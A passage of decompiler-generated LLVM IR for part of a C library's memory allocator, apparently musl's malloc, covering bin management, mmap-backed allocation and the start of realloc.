  store i32 %v1_804ac06, i32* %eax.global-to-local, align 4
  %v2_804ac09 = sub i32 %v0_804a9f0, %v1_804ac06
  %v8_804ac09 = xor i32 %v0_804a9f0, %v1_804ac06
  %v9_804ac09 = xor i32 %v2_804ac09, %v0_804a9f0
  %v10_804ac09 = and i32 %v9_804ac09, %v8_804ac09
  %v11_804ac09 = icmp slt i32 %v10_804ac09, 0
  %v13_804ac09 = icmp slt i32 %v2_804ac09, 0
  %v2_804ac0b = icmp eq i1 %v13_804ac09, %v11_804ac09
  br i1 %v2_804ac0b, label %dec_label_pc_804ac11, label %dec_label_pc_804ad4e

dec_label_pc_804ac11:                             ; preds = %dec_label_pc_804ac02
  store i32 %v3_804a9f5, i32* %ecx.global-to-local, align 4
  %v1_804ac15 = add i32 %v3_804a9f5, 4
  %v2_804ac15 = inttoptr i32 %v1_804ac15 to i32*
  %v3_804ac15 = load i32, i32* %v2_804ac15, align 4
  %v1_804ac18 = and i32 %v3_804ac15, -2
  store i32 %v1_804ac18, i32* %edi.global-to-local, align 4
  %v5_804ac1d = sub i32 %v1_804ac18, %stack_var_-40.0
  store i32 %v5_804ac1d, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ac25

dec_label_pc_804ac25:                             ; preds = %dec_label_pc_804ad57, %dec_label_pc_804ac11
  %v0_804ae53 = phi i32 [ %v5_804ac1d, %dec_label_pc_804ac11 ], [ %v5_804ad63, %dec_label_pc_804ad57 ]
  %stack_var_-56.0 = phi i32 [ %v1_804ac18, %dec_label_pc_804ac11 ], [ %v1_804ad5e, %dec_label_pc_804ad57 ]
  %v2_804ac27 = udiv i32 %v0_804ae53, 16
  %v1_804ac2a = add nsw i32 %v2_804ac27, -1
  store i32 %v1_804ac2a, i32* %eax.global-to-local, align 4
  %tmp60 = icmp ult i32 %v1_804ac2a, 33
  br i1 %tmp60, label %dec_label_pc_804ac5e, label %dec_label_pc_804ac32

dec_label_pc_804ac32:                             ; preds = %dec_label_pc_804ac25
  store i32 63, i32* %edx.global-to-local, align 4
  %tmp61 = icmp ult i32 %v1_804ac2a, 7169
  br i1 %tmp61, label %dec_label_pc_804ac3e, label %dec_label_pc_804ac56

dec_label_pc_804ac3e:                             ; preds = %dec_label_pc_804ac32
  %tmp63 = sitofp i32 %v1_804ac2a to float
  %v4_804ac49 = bitcast float %tmp63 to i32
  %v2_804ac4d = udiv i32 %v4_804ac49, 2097152
  store i32 %v2_804ac4d, i32* %eax.global-to-local, align 4
  %v1_804ac50 = add nsw i32 %v2_804ac4d, -496
  store i32 %v1_804ac50, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804ac56

dec_label_pc_804ac56:                             ; preds = %dec_label_pc_804ac32, %dec_label_pc_804ac3e
  %v0_804ac56 = phi i32 [ 63, %dec_label_pc_804ac32 ], [ %v1_804ac50, %dec_label_pc_804ac3e ]
  %v12_804ac56 = icmp eq i32 %v0_804ac56, %v0_804a9f0
  br i1 %v12_804ac56, label %dec_label_pc_804ae42, label %dec_label_pc_804ac5e

dec_label_pc_804ac5e:                             ; preds = %dec_label_pc_804ad57, %dec_label_pc_804ad4e, %dec_label_pc_804ac56, %dec_label_pc_804ac25, %dec_label_pc_804abfd
  store i32 %v3_804a9f5, i32* %edi.global-to-local, align 4
  %v1_804ac62 = add i32 %v3_804a9f5, 12
  %v2_804ac62 = inttoptr i32 %v1_804ac62 to i32*
  %v3_804ac62 = load i32, i32* %v2_804ac62, align 4
  store i32 %v3_804ac62, i32* %edx.global-to-local, align 4
  %v2_804ac65 = add i32 %v3_804a9f5, 8
  %v3_804ac65 = inttoptr i32 %v2_804ac65 to i32*
  %v4_804ac65 = load i32, i32* %v3_804ac65, align 4
  %v15_804ac65 = icmp eq i32 %v3_804ac62, %v4_804ac65
  br i1 %v15_804ac65, label %dec_label_pc_804ad93, label %dec_label_pc_804ac6e

dec_label_pc_804ac6e:                             ; preds = %dec_label_pc_804ac5e, %bb51
  %v3_804ac6e = phi i32 [ %v4_804ac65, %dec_label_pc_804ac5e ], [ %v3_804ac6e.pre, %bb51 ]
  %v1_804ac73 = phi i32 [ %v3_804ac62, %dec_label_pc_804ac5e ], [ %v3_804adbe, %bb51 ]
  store i32 %v3_804ac6e, i32* %eax.global-to-local, align 4
  store i32 %v3_804a9f5, i32* @esi, align 4
  %v2_804ac73 = add i32 %v1_804ac73, 8
  %v3_804ac73 = inttoptr i32 %v2_804ac73 to i32*
  store i32 %v3_804ac6e, i32* %v3_804ac73, align 4
  %v0_804ac76 = load i32, i32* %edi.global-to-local, align 4
  %v1_804ac76 = add i32 %v0_804ac76, 8
  %v2_804ac76 = inttoptr i32 %v1_804ac76 to i32*
  %v3_804ac76 = load i32, i32* %v2_804ac76, align 4
  store i32 %v3_804ac76, i32* %eax.global-to-local, align 4
  %v0_804ac79 = load i32, i32* %edx.global-to-local, align 4
  %v2_804ac79 = add i32 %v3_804ac76, 12
  %v3_804ac79 = inttoptr i32 %v2_804ac79 to i32*
  store i32 %v0_804ac79, i32* %v3_804ac79, align 4
  %v0_804ac7c = load i32, i32* %edi.global-to-local, align 4
  %v1_804ac7c = add i32 %v0_804ac7c, 4
  %v2_804ac7c = inttoptr i32 %v1_804ac7c to i32*
  %v3_804ac7c = load i32, i32* %v2_804ac7c, align 4
  %v1_804ac7f = or i32 %v3_804ac7c, 1
  store i32 %v1_804ac7f, i32* %eax.global-to-local, align 4
  store i32 %v1_804ac7f, i32* %v2_804ac7c, align 4
  %v0_804ac85 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ac85 = and i32 %v0_804ac85, -2
  store i32 %v1_804ac85, i32* %eax.global-to-local, align 4
  %v1_804ac88 = load i32, i32* %edi.global-to-local, align 4
  %v2_804ac88 = add i32 %v1_804ac88, %v1_804ac85
  %v3_804ac88 = inttoptr i32 %v2_804ac88 to i32*
  %v4_804ac88 = load i32, i32* %v3_804ac88, align 4
  %v5_804ac88 = or i32 %v4_804ac88, 1
  store i32 %v5_804ac88, i32* %v3_804ac88, align 4
  br label %dec_label_pc_804ac8c

dec_label_pc_804ac8c:                             ; preds = %dec_label_pc_804ae42, %dec_label_pc_804ac6e
  %v0_804ac8c = load i32, i32* @ebp, align 4
  %v2_804ac8e = mul i32 %v0_804ac8c, 16
  store i32 %v2_804ac8e, i32* @edx, align 4
  %v1_804ac91 = add i32 %v2_804ac8e, 134572480
  store i32 %v1_804ac91, i32* @ecx, align 4
  %v1_804ac97 = add i32 %v2_804ac8e, 134572488
  %v2_804ac97 = inttoptr i32 %v1_804ac97 to i32*
  %v3_804ac97 = load i32, i32* %v2_804ac97, align 8
  store i32 %v3_804ac97, i32* %eax.global-to-local, align 4
  store i32 %v1_804ac97, i32* @ebx, align 4
  %v1_804ac9d = icmp eq i32 %v3_804ac97, 0
  br i1 %v1_804ac9d, label %dec_label_pc_804ab4a, label %dec_label_pc_804aca5

dec_label_pc_804aca5:                             ; preds = %dec_label_pc_804ac8c
  store i32 0, i32* %v2_804ac97, align 8
  %v2_804acaa = load i32, i32* %stack_var_-108, align 4
  %v0_804acaf = load i32, i32* @edx, align 4
  %v1_804acaf = add i32 %v0_804acaf, 134572484
  store i32 %v1_804acaf, i32* %eax.global-to-local, align 4
  %v1_804acb5 = add i32 %v0_804acaf, 134572492
  %v2_804acb5 = inttoptr i32 %v1_804acb5 to i32*
  %v3_804acb5 = load i32, i32* %v2_804acb5, align 4
  store i32 %v3_804acb5, i32* %eax.global-to-local, align 4
  %v1_804acb8 = icmp eq i32 %v3_804acb5, 0
  br i1 %v1_804acb8, label %dec_label_pc_804ab4a, label %dec_label_pc_804acc0

dec_label_pc_804acc0:                             ; preds = %dec_label_pc_804aca5
  store i32 240, i32* @ebp, align 4
  store i32 129, i32* @ecx, align 4
  store i32 240, i32* @eax, align 4
  %v0_804accc = load i32, i32* @ebx, align 4
  store i32 %v0_804accc, i32* @edx, align 4
  store i32 1, i32* @edi, align 4
  %v1_804acd3 = call i32 @__vsyscall(i32 %v2_804acaa)
  store i32 %v1_804acd3, i32* %eax.global-to-local, align 4
  %v10_804acd8 = icmp eq i32 %v1_804acd3, -38
  %v1_804acdb = icmp eq i1 %v10_804acd8, false
  br i1 %v1_804acdb, label %dec_label_pc_804ab4a, label %dec_label_pc_804ace1

dec_label_pc_804ace1:                             ; preds = %dec_label_pc_804acc0
  %v0_804ace1 = load i32, i32* @ebp, align 4
  store i32 %v0_804ace1, i32* @eax, align 4
  %v0_804ace3 = load i32, i32* @edi, align 4
  store i32 %v0_804ace3, i32* @ecx, align 4
  %v0_804ace5 = load i32, i32* %stack_var_-108, align 4
  %v1_804ace5 = call i32 @__vsyscall(i32 %v0_804ace5)
  store i32 %v1_804ace5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ab4a

dec_label_pc_804acef:                             ; preds = %dec_label_pc_804ab4a
  %v0_804acf3 = load i32, i32* @esi, align 4
  %v2_804acf3 = add i32 %v0_804acf3, %stack_var_-40.0
  store i32 %v2_804acf3, i32* %eax.global-to-local, align 4
  %v1_804acfa = or i32 %stack_var_-40.0, 1
  store i32 %v1_804acfa, i32* @ecx, align 4
  %v5_804acfd = sub i32 %v1_804ab51, %stack_var_-40.0
  store i32 %v5_804acfd, i32* %edx.global-to-local, align 4
  %v2_804ad01 = inttoptr i32 %v2_804acf3 to i32*
  store i32 %v1_804acfa, i32* %v2_804ad01, align 4
  %v0_804ad03 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ad03 = or i32 %v0_804ad03, 1
  store i32 %v1_804ad03, i32* %edx.global-to-local, align 4
  %v1_804ad06 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ad06 = add i32 %v1_804ad06, 4
  %v3_804ad06 = inttoptr i32 %v2_804ad06 to i32*
  store i32 %v1_804ad03, i32* %v3_804ad06, align 4
  %v0_804ad09 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ad09 = add i32 %v0_804ad09, 8
  store i32 %v1_804ad09, i32* @eax, align 4
  %v0_804ad0c = load i32, i32* %edx.global-to-local, align 4
  %v1_804ad0c = load i32, i32* @esi, align 4
  %v2_804ad0c = load i32, i32* @ebx, align 4
  %v3_804ad0c = add i32 %v2_804ad0c, %v1_804ad0c
  %v4_804ad0c = inttoptr i32 %v3_804ad0c to i32*
  store i32 %v0_804ad0c, i32* %v4_804ad0c, align 4
  %v0_804ad0f = load i32, i32* @ecx, align 4
  %v1_804ad0f = load i32, i32* @edi, align 4
  %v2_804ad0f = add i32 %v1_804ad0f, 4
  %v3_804ad0f = inttoptr i32 %v2_804ad0f to i32*
  store i32 %v0_804ad0f, i32* %v3_804ad0f, align 4
  %v0_804ad12 = load i32, i32* @eax, align 4
  store i32 %v0_804ad12, i32* %stack_var_-108, align 4
  %v1_804ad15 = call i32 @free(i32 %v0_804ad12)
  store i32 %v1_804ad15, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ab61

dec_label_pc_804ad1f:                             ; preds = %dec_label_pc_804ab01
  store i32 240, i32* %esi.global-to-local, align 4
  store i32 129, i32* @ecx, align 4
  store i32 240, i32* @eax, align 4
  %v0_804ad2b = load i32, i32* @ebp, align 4
  store i32 %v0_804ad2b, i32* @edx, align 4
  store i32 1, i32* @edi, align 4
  %v1_804ad32 = call i32 @__vsyscall(i32 %v2_804ab08)
  store i32 %v1_804ad32, i32* %eax.global-to-local, align 4
  %v10_804ad37 = icmp eq i32 %v1_804ad32, -38
  %v1_804ad3a = icmp eq i1 %v10_804ad37, false
  br i1 %v1_804ad3a, label %dec_label_pc_804ab1a, label %dec_label_pc_804ad40

dec_label_pc_804ad40:                             ; preds = %dec_label_pc_804ad1f
  %v0_804ad40 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_804ad40, i32* @eax, align 4
  %v0_804ad42 = load i32, i32* @edi, align 4
  store i32 %v0_804ad42, i32* @ecx, align 4
  %v0_804ad44 = load i32, i32* %stack_var_-108, align 4
  %v1_804ad44 = call i32 @__vsyscall(i32 %v0_804ad44)
  store i32 %v1_804ad44, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ab1a

dec_label_pc_804ad4e:                             ; preds = %dec_label_pc_804ac02
  %v9_804ad4e = icmp eq i32 %v0_804a9f0, 63
  %v1_804ad51 = icmp eq i1 %v9_804ad4e, false
  br i1 %v1_804ad51, label %dec_label_pc_804ac5e, label %dec_label_pc_804ad57

dec_label_pc_804ad57:                             ; preds = %dec_label_pc_804ad4e
  store i32 %v3_804a9f5, i32* %eax.global-to-local, align 4
  %v1_804ad5b = add i32 %v3_804a9f5, 4
  %v2_804ad5b = inttoptr i32 %v1_804ad5b to i32*
  %v3_804ad5b = load i32, i32* %v2_804ad5b, align 4
  %v1_804ad5e = and i32 %v3_804ad5b, -2
  store i32 %v1_804ad5e, i32* %edx.global-to-local, align 4
  %v5_804ad63 = sub i32 %v1_804ad5e, %stack_var_-40.0
  store i32 %v5_804ad63, i32* %ebx.global-to-local, align 4
  %tmp64 = icmp ult i32 %v5_804ad63, 114689
  br i1 %tmp64, label %dec_label_pc_804ac5e, label %dec_label_pc_804ac25

dec_label_pc_804ad7c:                             ; preds = %dec_label_pc_804aaa7
  %v0_804ad7c = load i32, i32* @global_var_80569a4.341, align 4
  store i32 %v0_804ad7c, i32* %eax.global-to-local, align 4
  %v1_804ad81 = icmp eq i32 %v0_804ad7c, 0
  %v1_804ad83 = icmp eq i1 %v1_804ad81, false
  br i1 %v1_804ad83, label %dec_label_pc_804ae7d, label %dec_label_pc_804ad89

dec_label_pc_804ad89:                             ; preds = %dec_label_pc_804ae95, %dec_label_pc_804ae7d, %dec_label_pc_804addc, %dec_label_pc_804ad7c
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v0_804a913, i32* @ebx, align 4
  store i32 %v0_804a912, i32* @esi, align 4
  store i32 %v0_804a911, i32* @edi, align 4
  store i32 %v0_804a910, i32* @ebp, align 4
  ret i32 0

dec_label_pc_804ad93:                             ; preds = %dec_label_pc_804ac5e
  store i32 %v0_804a9f0, i32* %ecx.global-to-local, align 4
  %v2_804ad99 = and i32 %v0_804a9f0, 32
  %v3_804ad99 = icmp eq i32 %v2_804ad99, 0
  %v1_804ad9c = icmp eq i1 %v3_804ad99, false
  %v2_804ad9c = zext i1 %v1_804ad9c to i32
  store i32 %v2_804ad9c, i32* %edx.global-to-local, align 4
  %v1_804ad9f = zext i1 %v3_804ad99 to i32
  store i32 %v1_804ad9f, i32* %eax.global-to-local, align 4
  %v2_804ada2 = urem i32 %v0_804a9f0, 32
  %v4_804ada2 = icmp eq i32 %v2_804ada2, 0
  br i1 %v4_804ada2, label %.thread, label %bb50

.thread:                                          ; preds = %dec_label_pc_804ad93
  store i32 ptrtoint (i32* @global_var_80569c0.334 to i32), i32* %esi.global-to-local, align 4
  br label %bb51

bb50:                                             ; preds = %dec_label_pc_804ad93
  %v5_804ada2 = shl i32 %v2_804ad9c, %v2_804ada2
  store i32 %v5_804ada2, i32* %edx.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80569c0.334 to i32), i32* %esi.global-to-local, align 4
  %v5_804ada9 = shl i32 %v1_804ad9f, %v2_804ada2
  store i32 %v5_804ada9, i32* %eax.global-to-local, align 4
  br label %bb51

bb51:                                             ; preds = %.thread, %bb50
  %v0_804adab26 = phi i32 [ %v5_804ada2, %bb50 ], [ %v2_804ad9c, %.thread ]
  %v0_804adaf = phi i32 [ %v5_804ada9, %bb50 ], [ %v1_804ad9f, %.thread ]
  %v1_804adab = sub i32 -1, %v0_804adab26
  store i32 %v1_804adab, i32* %edx.global-to-local, align 4
  %v1_804adaf = sub i32 -1, %v0_804adaf
  store i32 %v1_804adaf, i32* %eax.global-to-local, align 4
  store i32 %v1_804adab, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v2_804adb7 = load i32, i32* @global_var_80569c0.334, align 4
  %v4_804adb7 = and i32 %v2_804adb7, %v1_804adaf
  store i32 %v4_804adb7, i32* @global_var_80569c0.334, align 4
  %v3_804adba = load i32, i32* @global_var_80569c4.335, align 4
  %v5_804adba = and i32 %v3_804adba, %v1_804adab
  store i32 %v5_804adba, i32* @global_var_80569c4.335, align 4
  %v3_804adbe = load i32, i32* %v2_804ac62, align 4
  store i32 %v3_804adbe, i32* %edx.global-to-local, align 4
  store i32 %v3_804a9f5, i32* %edi.global-to-local, align 4
  %v3_804ac6e.pre = load i32, i32* %v3_804ac65, align 4
  br label %dec_label_pc_804ac6e

dec_label_pc_804adca:                             ; preds = %dec_label_pc_804a929
  %v2_804adca = call i32 @__errno_location(i32 0)
  %v1_804adcf = inttoptr i32 %v2_804adca to i32*
  store i32 12, i32* %v1_804adcf, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ab64

dec_label_pc_804addc:                             ; preds = %dec_label_pc_804aba4
  %v1_804adde = add i32 %v1_804aba7, 4103
  %v1_804ade4 = and i32 %v1_804adde, -4096
  store i32 %v1_804ade4, i32* @esi, align 4
  store i32 0, i32* %stack_var_-108, align 4
  %v8_804ae1d = call i32 @__mmap(i32 0, i32 %v1_804ade4, i32 3, i8 34, i32 -1, i32 0, i32 0)
  store i32 %v8_804ae1d, i32* %eax.global-to-local, align 4
  %v10_804ae22 = icmp eq i32 %v8_804ae1d, -1
  store i32 %v8_804ae1d, i32* %ebx.global-to-local, align 4
  br i1 %v10_804ae22, label %dec_label_pc_804ad89, label %dec_label_pc_804ae2d

dec_label_pc_804ae2d:                             ; preds = %dec_label_pc_804addc
  %v0_804ae2d = load i32, i32* @esi, align 4
  %v1_804ae2d = add i32 %v0_804ae2d, -8
  %v2_804ae30 = add i32 %v8_804ae1d, 12
  %v3_804ae30 = inttoptr i32 %v2_804ae30 to i32*
  store i32 %v1_804ae2d, i32* %v3_804ae30, align 4
  %v0_804ae33 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ae33 = add i32 %v0_804ae33, 16
  store i32 %v1_804ae33, i32* %eax.global-to-local, align 4
  %v1_804ae36 = add i32 %v0_804ae33, 8
  %v2_804ae36 = inttoptr i32 %v1_804ae36 to i32*
  store i32 8, i32* %v2_804ae36, align 4
  %v0_804ab6b.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ab64

dec_label_pc_804ae42:                             ; preds = %dec_label_pc_804ac56
  store i32 %v3_804a9f5, i32* @esi, align 4
  store i32 %stack_var_-40.0, i32* %edx.global-to-local, align 4
  %v1_804ae4a = add i32 %v3_804a9f5, 12
  %v2_804ae4a = inttoptr i32 %v1_804ae4a to i32*
  %v3_804ae4a = load i32, i32* %v2_804ae4a, align 4
  store i32 %v3_804ae4a, i32* %ecx.global-to-local, align 4
  %v2_804ae4d = add i32 %v3_804a9f5, %stack_var_-40.0
  store i32 %v2_804ae4d, i32* %eax.global-to-local, align 4
  %v1_804ae50 = add i32 %v3_804a9f5, 8
  %v2_804ae50 = inttoptr i32 %v1_804ae50 to i32*
  %v3_804ae50 = load i32, i32* %v2_804ae50, align 4
  store i32 %v3_804ae50, i32* %edx.global-to-local, align 4
  %v2_804ae53 = add i32 %v2_804ae4d, 4
  %v3_804ae53 = inttoptr i32 %v2_804ae53 to i32*
  store i32 %v0_804ae53, i32* %v3_804ae53, align 4
  %v0_804ae56 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ae56 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ae56 = add i32 %v1_804ae56, 12
  %v3_804ae56 = inttoptr i32 %v2_804ae56 to i32*
  store i32 %v0_804ae56, i32* %v3_804ae56, align 4
  %v0_804ae59 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ae59 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ae59 = add i32 %v1_804ae59, 8
  %v3_804ae59 = inttoptr i32 %v2_804ae59 to i32*
  store i32 %v0_804ae59, i32* %v3_804ae59, align 4
  %v0_804ae5c = load i32, i32* %eax.global-to-local, align 4
  %v1_804ae5c = load i32, i32* %ecx.global-to-local, align 4
  %v2_804ae5c = add i32 %v1_804ae5c, 8
  %v3_804ae5c = inttoptr i32 %v2_804ae5c to i32*
  store i32 %v0_804ae5c, i32* %v3_804ae5c, align 4
  %v0_804ae5f = load i32, i32* %eax.global-to-local, align 4
  %v1_804ae5f = add i32 %v0_804ae5f, 8
  %v2_804ae5f = inttoptr i32 %v1_804ae5f to i32*
  %v3_804ae5f = load i32, i32* %v2_804ae5f, align 4
  store i32 %stack_var_-56.0, i32* %ecx.global-to-local, align 4
  %v2_804ae66 = add i32 %v3_804ae5f, 12
  %v3_804ae66 = inttoptr i32 %v2_804ae66 to i32*
  store i32 %v0_804ae5f, i32* %v3_804ae66, align 4
  %v1_804ae6d = or i32 %stack_var_-40.0, 1
  store i32 %v1_804ae6d, i32* %edx.global-to-local, align 4
  %v1_804ae70 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ae70 = inttoptr i32 %v1_804ae70 to i32*
  store i32 %v1_804ae6d, i32* %v2_804ae70, align 4
  %v0_804ae72 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ae72 = load i32, i32* @esi, align 4
  %v2_804ae72 = add i32 %v1_804ae72, 4
  %v3_804ae72 = inttoptr i32 %v2_804ae72 to i32*
  store i32 %v0_804ae72, i32* %v3_804ae72, align 4
  %v0_804ae75 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ae75 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804ae75 = load i32, i32* @esi, align 4
  %v3_804ae75 = add i32 %v2_804ae75, %v1_804ae75
  %v4_804ae75 = inttoptr i32 %v3_804ae75 to i32*
  store i32 %v0_804ae75, i32* %v4_804ae75, align 4
  br label %dec_label_pc_804ac8c

dec_label_pc_804ae7d:                             ; preds = %dec_label_pc_804ad7c
  store i32 0, i32* @global_var_80569a4.341, align 4
  %v2_804ae83 = load i32, i32* %stack_var_-108, align 4
  %v0_804ae88 = load i32, i32* @global_var_80569a8.343, align 8
  store i32 %v0_804ae88, i32* %eax.global-to-local, align 4
  %v1_804ae8d = icmp eq i32 %v0_804ae88, 0
  br i1 %v1_804ae8d, label %dec_label_pc_804ad89, label %dec_label_pc_804ae95

dec_label_pc_804ae95:                             ; preds = %dec_label_pc_804ae7d
  store i32 240, i32* @ebx, align 4
  store i32 129, i32* @ecx, align 4
  store i32 1, i32* @edi, align 4
  store i32 240, i32* @eax, align 4
  %v0_804aea3 = load i32, i32* @ebp, align 4
  store i32 %v0_804aea3, i32* @edx, align 4
  %v1_804aea5 = call i32 @__vsyscall(i32 %v2_804ae83)
  store i32 %v1_804aea5, i32* %eax.global-to-local, align 4
  %v10_804aeaa = icmp eq i32 %v1_804aea5, -38
  %v1_804aead = icmp eq i1 %v10_804aeaa, false
  br i1 %v1_804aead, label %dec_label_pc_804ad89, label %dec_label_pc_804aeb3

dec_label_pc_804aeb3:                             ; preds = %dec_label_pc_804ae95
  %v0_804aeb3 = load i32, i32* @ebx, align 4
  store i32 %v0_804aeb3, i32* @eax, align 4
  %v0_804aeb5 = load i32, i32* @edi, align 4
  store i32 %v0_804aeb5, i32* @ecx, align 4
  %v0_804aeb7 = load i32, i32* %stack_var_-108, align 4
  %v1_804aeb7 = call i32 @__vsyscall(i32 %v0_804aeb7)
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ab64

; uselistorder directives
  uselistorder i32 %v8_804ae1d, { 1, 2, 0, 3 }
  uselistorder i32 %v3_804adbe, { 1, 0 }
  uselistorder i32 %v1_804adaf, { 1, 0 }
  uselistorder i32 %v1_804adab, { 2, 1, 0 }
  uselistorder i32 %v2_804ada2, { 2, 1, 0 }
  uselistorder i32 %v5_804ad63, { 0, 2, 1 }
  uselistorder i32 %v1_804ad5e, { 1, 2, 0 }
  uselistorder i32 %v2_804ac8e, { 2, 1, 0 }
  uselistorder i32 %v3_804ac6e, { 1, 0 }
  uselistorder i32 %v4_804ac65, { 1, 0 }
  uselistorder i32 %v3_804ac62, { 1, 0, 2 }
  uselistorder i32 %v2_804ac4d, { 1, 0 }
  uselistorder i32 %v0_804ae53, { 1, 0 }
  uselistorder i32 %v2_804ac09, { 1, 0 }
  uselistorder i32 %v1_804abfd, { 1, 0 }
  uselistorder i32 %v1_804abe6, { 1, 0 }
  uselistorder i32 %v1_804abbf, { 0, 1, 3, 2 }
  uselistorder i32 %v1_804aba7, { 2, 3, 4, 0, 1 }
  uselistorder i32 %stack_var_-64.0, { 1, 0 }
  uselistorder i32 %v3_804ab2b, { 1, 0, 2 }
  uselistorder i32 %v3_804aad4, { 1, 0 }
  uselistorder i32 %v2_804aaae, { 2, 1, 3, 0, 4, 5, 6 }
  uselistorder i32 %v2_804aa15, { 2, 1, 0 }
  uselistorder i32 %v1_804aa76, { 1, 0, 2 }
  uselistorder i32 %v3_804a9f5, { 8, 7, 12, 11, 6, 10, 9, 5, 17, 16, 15, 14, 13, 1, 2, 3, 4, 0, 18, 19 }
  uselistorder i32 %v2_804a9f2, { 2, 3, 1, 0 }
  uselistorder i32 %v0_804a9f0, { 2, 4, 5, 1, 0, 6, 7, 9, 8, 11, 10, 12, 3 }
  uselistorder i32 %v2_804a99e, { 2, 1, 0 }
  uselistorder i1 %v3_804a978, { 1, 0 }
  uselistorder i32 %v2_804a978, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804a976, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_804abf4, { 2, 0, 1 }
  uselistorder i32 %v2_804a950, { 1, 0 }
  uselistorder i32 %v4_804a941, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-40.0, { 3, 0, 4, 2, 6, 7, 1, 5, 8, 9 }
  uselistorder i32 %v0_804a913, { 1, 0 }
  uselistorder i32 %v0_804a912, { 1, 0 }
  uselistorder i32 %v0_804a911, { 1, 0 }
  uselistorder i32 %v0_804a910, { 1, 0 }
  uselistorder i32* %stack_var_-108, { 0, 4, 5, 2, 6, 1, 7, 8, 9, 10, 3, 11, 12 }
  uselistorder i32* %stack_var_-28, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32* %esi.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 23, 21, 22, 24, 25, 26, 27, 28, 29, 30 }
  uselistorder i32* %ebx.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %eax.global-to-local, { 1, 3, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 30, 27, 28, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 54, 49, 50, 51, 52, 53, 57, 55, 0, 56, 58, 60, 64, 61, 62, 63, 59, 65, 66, 67, 69, 68, 70, 71, 72, 73, 74 }
  uselistorder i32 ptrtoint (i32* @global_var_80569c0.334 to i32), { 2, 0, 3, 4, 5, 1, 6 }
  uselistorder i32 -496, { 4, 0, 1, 2, 3 }
  uselistorder i32 ()* @alloc_rev, { 1, 0 }
  uselistorder i32 (i32*)* @__expand_heap, { 1, 0 }
  uselistorder i32* @global_var_80569a4.341, { 3, 4, 5, 6, 2, 7, 8, 0, 1, 9 }
  uselistorder i32 134572484, { 0, 1, 2, 5, 3, 4 }
  uselistorder i32 134572496, { 0, 1, 2, 5, 3, 4 }
  uselistorder i32 134572492, { 0, 1, 6, 2, 3, 8, 4, 5, 7 }
  uselistorder i32 134572488, { 2, 3, 8, 4, 5, 6, 0, 7, 1 }
  uselistorder i32 134572480, { 0, 1, 2, 3, 6, 7, 4, 5 }
  uselistorder i32* @global_var_80569c0.334, { 0, 4, 5, 1, 6, 2, 7, 9, 3, 8 }
  uselistorder i32 %arg1, { 0, 1, 3, 2 }
  uselistorder label %bb51, { 1, 0 }
  uselistorder label %dec_label_pc_804ac6e, { 1, 0 }
  uselistorder label %dec_label_pc_804ac56, { 1, 0 }
  uselistorder label %dec_label_pc_804ab6c, { 1, 0 }
  uselistorder label %dec_label_pc_804ab61, { 1, 0 }
  uselistorder label %dec_label_pc_804ab4a, { 4, 0, 1, 2, 5, 3 }
  uselistorder label %dec_label_pc_804ab1a, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804aad4, { 1, 0 }
  uselistorder label %dec_label_pc_804aaa7, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804aa13, { 1, 0 }
  uselistorder label %dec_label_pc_804a997, { 1, 0 }
  uselistorder label %dec_label_pc_804a963, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_804a95b, { 1, 0 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %dec_label_pc_804a941, { 2, 0, 1 }
}

define i32 @realloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg1, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  %v1_804aee7 = icmp eq i32 %arg1, 0
  %v0_804aee9 = load i32, i32* @ebp, align 4
  br i1 %v1_804aee7, label %dec_label_pc_804b0b2, label %dec_label_pc_804aef7

dec_label_pc_804aef7:                             ; preds = %entry
  %v1_804aef7 = add i32 %arg2, -1
  store i32 %v1_804aef7, i32* %eax.global-to-local, align 4
  %v6_804aeff = icmp ugt i32 %v1_804aef7, 2147479535
